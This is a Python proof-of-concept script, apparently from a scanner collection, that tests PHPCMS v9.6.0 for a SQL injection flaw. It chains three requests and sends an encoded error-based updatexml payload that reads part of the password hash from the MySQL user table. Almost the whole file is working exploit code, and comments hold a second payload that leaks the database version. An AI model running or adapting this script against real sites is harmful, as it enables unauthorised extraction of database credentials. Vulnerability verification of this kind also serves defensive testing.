#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms v9.6.0 SQL注入
referer: https://zhuanlan.zhihu.com/p/26263513
author: Lucifer
description: 过滤函数不严谨造成的过滤绕过。
'''
import sys
import requests
import warnings
from termcolor import cprint

class phpcms_v96_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Content-Type":"application/x-www-form-urlencoded", 
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
        tmp_cookie = {}
        try:
            req = requests.get(url_prefix, headers=headers, timeout=10, verify=False)
            for cookie in req.cookies:
                tmp_cookie = cookie.value
            # print '第一次请求得到的TMP COOKIE: {}'.format(tmp_cookie)
        except:
            pass
        post_data = {
            "userid_flash":tmp_cookie
        }
        url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id="\
        "%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20SUBSTRING%28password,30%29%20from%20mysql.user%20limit%200,1%29%29%2C0x7e%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
        # %25*27+and+updatexml(1%2cconcat(1%2c(%40%40version))%2c1)%23%26m%3d1%26f%3dhaha%26modelid%3d2%26catid%3d7%26
        # url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28version%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
        try:
            req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=10, verify=False)
            for cookie in req2.cookies:
                tmp_cookie = cookie.value
            # print '第二次请求得到的TMP COOKIE: {}'.format(tmp_cookie)
        except:
            pass
        
        vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)
        try:
            req3 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            print 'HTTP RESPONSE：{}'.format(req3.content)
            if r"XPATH syntax error" in req3.text:
                cprint("[+]存在phpcms v9.6.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
        except:
            print("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpcms_v96_sqli_BaseVerify('http://localhost/PHPCMS/PHPCMS_v9.6.0/')
    testVuln.run()